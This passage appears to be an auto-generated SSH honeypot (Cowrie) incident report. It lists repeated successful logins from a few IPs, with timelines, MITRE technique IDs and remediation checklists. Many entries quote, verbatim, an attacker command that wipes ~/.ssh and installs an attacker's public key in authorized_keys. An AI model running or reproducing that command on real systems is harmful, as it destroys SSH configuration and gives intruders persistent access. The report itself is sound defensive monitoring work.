- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a13f8c004c22

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:27 |
| **Last Seen** | 2026-04-14 02:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:27:09` | `cowrie.session.connect` |
| `2026-04-14 02:27:09` | `cowrie.client.version` |
| `2026-04-14 02:27:10` | `cowrie.client.kex` |
| `2026-04-14 02:27:11` | `cowrie.login.success` |
| `2026-04-14 02:27:11` | `cowrie.session.params` |
| `2026-04-14 02:27:11` | `cowrie.command.input` |
| `2026-04-14 02:27:11` | `cowrie.command.failed` |
| `2026-04-14 02:27:12` | `cowrie.log.closed` |
| `2026-04-14 02:27:12` | `cowrie.session.params` |
| `2026-04-14 02:27:12` | `cowrie.command.input` |
| `2026-04-14 02:27:13` | `cowrie.session.file_download` |
| `2026-04-14 02:27:13` | `cowrie.log.closed` |
| `2026-04-14 02:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656f73720c20

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:27 |
| **Last Seen** | 2026-04-14 02:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:27:16` | `cowrie.session.connect` |
| `2026-04-14 02:27:16` | `cowrie.client.version` |
| `2026-04-14 02:27:16` | `cowrie.client.kex` |
| `2026-04-14 02:27:17` | `cowrie.login.success` |
| `2026-04-14 02:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c9dcc76a051

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:29 |
| **Last Seen** | 2026-04-14 02:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:29:08` | `cowrie.session.connect` |
| `2026-04-14 02:29:08` | `cowrie.client.version` |
| `2026-04-14 02:29:08` | `cowrie.client.kex` |
| `2026-04-14 02:29:09` | `cowrie.login.success` |
| `2026-04-14 02:29:10` | `cowrie.session.params` |
| `2026-04-14 02:29:10` | `cowrie.command.input` |
| `2026-04-14 02:29:10` | `cowrie.command.failed` |
| `2026-04-14 02:29:10` | `cowrie.log.closed` |
| `2026-04-14 02:29:11` | `cowrie.session.params` |
| `2026-04-14 02:29:11` | `cowrie.command.input` |
| `2026-04-14 02:29:11` | `cowrie.session.file_download` |
| `2026-04-14 02:29:11` | `cowrie.log.closed` |
| `2026-04-14 02:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ca0bf85424

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-04-14 02:29 |
| **Last Seen** | 2026-04-14 02:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:29:14` | `cowrie.session.connect` |
| `2026-04-14 02:29:14` | `cowrie.client.version` |
| `2026-04-14 02:29:15` | `cowrie.client.kex` |
| `2026-04-14 02:29:16` | `cowrie.login.success` |
| `2026-04-14 02:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3382ef0ca1a

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:29 |
| **Last Seen** | 2026-04-14 02:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:29:47` | `cowrie.session.connect` |
| `2026-04-14 02:29:47` | `cowrie.client.version` |
| `2026-04-14 02:29:47` | `cowrie.client.kex` |
| `2026-04-14 02:29:47` | `cowrie.login.success` |
| `2026-04-14 02:29:48` | `cowrie.session.params` |
| `2026-04-14 02:29:48` | `cowrie.command.input` |
| `2026-04-14 02:29:48` | `cowrie.command.failed` |
| `2026-04-14 02:29:48` | `cowrie.log.closed` |
| `2026-04-14 02:29:48` | `cowrie.session.params` |
| `2026-04-14 02:29:48` | `cowrie.command.input` |
| `2026-04-14 02:29:48` | `cowrie.session.file_download` |
| `2026-04-14 02:29:48` | `cowrie.log.closed` |
| `2026-04-14 02:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f01fe332d6aa

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:29 |
| **Last Seen** | 2026-04-14 02:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:29:50` | `cowrie.session.connect` |
| `2026-04-14 02:29:50` | `cowrie.client.version` |
| `2026-04-14 02:29:50` | `cowrie.client.kex` |
| `2026-04-14 02:29:50` | `cowrie.login.success` |
| `2026-04-14 02:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f79813da30c4

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:30 |
| **Last Seen** | 2026-04-14 02:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:30:32` | `cowrie.session.connect` |
| `2026-04-14 02:30:32` | `cowrie.client.version` |
| `2026-04-14 02:30:32` | `cowrie.client.kex` |
| `2026-04-14 02:30:32` | `cowrie.login.success` |
| `2026-04-14 02:30:33` | `cowrie.session.params` |
| `2026-04-14 02:30:33` | `cowrie.command.input` |
| `2026-04-14 02:30:33` | `cowrie.command.failed` |
| `2026-04-14 02:30:33` | `cowrie.log.closed` |
| `2026-04-14 02:30:33` | `cowrie.session.params` |
| `2026-04-14 02:30:33` | `cowrie.command.input` |
| `2026-04-14 02:30:33` | `cowrie.session.file_download` |
| `2026-04-14 02:30:33` | `cowrie.log.closed` |
| `2026-04-14 02:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31205e624d2

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:30 |
| **Last Seen** | 2026-04-14 02:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:30:35` | `cowrie.session.connect` |
| `2026-04-14 02:30:35` | `cowrie.client.version` |
| `2026-04-14 02:30:35` | `cowrie.client.kex` |
| `2026-04-14 02:30:35` | `cowrie.login.success` |
| `2026-04-14 02:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2522aa8fc102

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:31 |
| **Last Seen** | 2026-04-14 02:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:31:23` | `cowrie.session.connect` |
| `2026-04-14 02:31:23` | `cowrie.client.version` |
| `2026-04-14 02:31:23` | `cowrie.client.kex` |
| `2026-04-14 02:31:24` | `cowrie.login.success` |
| `2026-04-14 02:31:24` | `cowrie.session.params` |
| `2026-04-14 02:31:24` | `cowrie.command.input` |
| `2026-04-14 02:31:24` | `cowrie.command.failed` |
| `2026-04-14 02:31:24` | `cowrie.log.closed` |
| `2026-04-14 02:31:25` | `cowrie.session.params` |
| `2026-04-14 02:31:25` | `cowrie.command.input` |
| `2026-04-14 02:31:25` | `cowrie.session.file_download` |
| `2026-04-14 02:31:25` | `cowrie.log.closed` |
| `2026-04-14 02:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03e5446e57bd

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:31 |
| **Last Seen** | 2026-04-14 02:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:31:27` | `cowrie.session.connect` |
| `2026-04-14 02:31:27` | `cowrie.client.version` |
| `2026-04-14 02:31:27` | `cowrie.client.kex` |
| `2026-04-14 02:31:28` | `cowrie.login.success` |
| `2026-04-14 02:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c70fefc2d1

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:32 |
| **Last Seen** | 2026-04-14 02:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:32:37` | `cowrie.session.connect` |
| `2026-04-14 02:32:37` | `cowrie.client.version` |
| `2026-04-14 02:32:37` | `cowrie.client.kex` |
| `2026-04-14 02:32:37` | `cowrie.login.success` |
| `2026-04-14 02:32:38` | `cowrie.session.params` |
| `2026-04-14 02:32:38` | `cowrie.command.input` |
| `2026-04-14 02:32:38` | `cowrie.command.failed` |
| `2026-04-14 02:32:38` | `cowrie.log.closed` |
| `2026-04-14 02:32:38` | `cowrie.session.params` |
| `2026-04-14 02:32:38` | `cowrie.command.input` |
| `2026-04-14 02:32:38` | `cowrie.session.file_download` |
| `2026-04-14 02:32:38` | `cowrie.log.closed` |
| `2026-04-14 02:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5406887337d8

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:32 |
| **Last Seen** | 2026-04-14 02:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:32:40` | `cowrie.session.connect` |
| `2026-04-14 02:32:40` | `cowrie.client.version` |
| `2026-04-14 02:32:40` | `cowrie.client.kex` |
| `2026-04-14 02:32:40` | `cowrie.login.success` |
| `2026-04-14 02:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed6244c223b7

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:33 |
| **Last Seen** | 2026-04-14 02:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:33:19` | `cowrie.session.connect` |
| `2026-04-14 02:33:19` | `cowrie.client.version` |
| `2026-04-14 02:33:19` | `cowrie.client.kex` |
| `2026-04-14 02:33:19` | `cowrie.login.success` |
| `2026-04-14 02:33:20` | `cowrie.session.params` |
| `2026-04-14 02:33:20` | `cowrie.command.input` |
| `2026-04-14 02:33:20` | `cowrie.command.failed` |
| `2026-04-14 02:33:20` | `cowrie.log.closed` |
| `2026-04-14 02:33:20` | `cowrie.session.params` |
| `2026-04-14 02:33:20` | `cowrie.command.input` |
| `2026-04-14 02:33:20` | `cowrie.session.file_download` |
| `2026-04-14 02:33:20` | `cowrie.log.closed` |
| `2026-04-14 02:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eefe08860bed

| Field | Detail |
|---|---|
| **Source IP** | `103.161.170[.]12` |
| **First Seen** | 2026-04-14 02:33 |
| **Last Seen** | 2026-04-14 02:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:33:22` | `cowrie.session.connect` |
| `2026-04-14 02:33:22` | `cowrie.client.version` |
| `2026-04-14 02:33:22` | `cowrie.client.kex` |
| `2026-04-14 02:33:22` | `cowrie.login.success` |
| `2026-04-14 02:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.161.170[.]12` to AbuseIPDB if not already reported
- [ ] Block `103.161.170[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5135b2f3eba

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:34 |
| **Last Seen** | 2026-04-14 02:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:34:08` | `cowrie.session.connect` |
| `2026-04-14 02:34:08` | `cowrie.client.version` |
| `2026-04-14 02:34:09` | `cowrie.client.kex` |
| `2026-04-14 02:34:09` | `cowrie.login.success` |
| `2026-04-14 02:34:09` | `cowrie.session.params` |
| `2026-04-14 02:34:09` | `cowrie.command.input` |
| `2026-04-14 02:34:09` | `cowrie.command.failed` |
| `2026-04-14 02:34:10` | `cowrie.log.closed` |
| `2026-04-14 02:34:10` | `cowrie.session.params` |
| `2026-04-14 02:34:10` | `cowrie.command.input` |
| `2026-04-14 02:34:10` | `cowrie.session.file_download` |
| `2026-04-14 02:34:10` | `cowrie.log.closed` |
| `2026-04-14 02:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e0134fd1a8

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:34 |
| **Last Seen** | 2026-04-14 02:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:34:12` | `cowrie.session.connect` |
| `2026-04-14 02:34:12` | `cowrie.client.version` |
| `2026-04-14 02:34:12` | `cowrie.client.kex` |
| `2026-04-14 02:34:13` | `cowrie.login.success` |
| `2026-04-14 02:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.253[.]36` to AbuseIPDB if not already reported
- [ ] Block `152.89.253[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816f57ef9951

| Field | Detail |
|---|---|
| **Source IP** | `152.89.253[.]36` |
| **First Seen** | 2026-04-14 02:35 |
| **Last Seen** | 2026-04-14 02:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
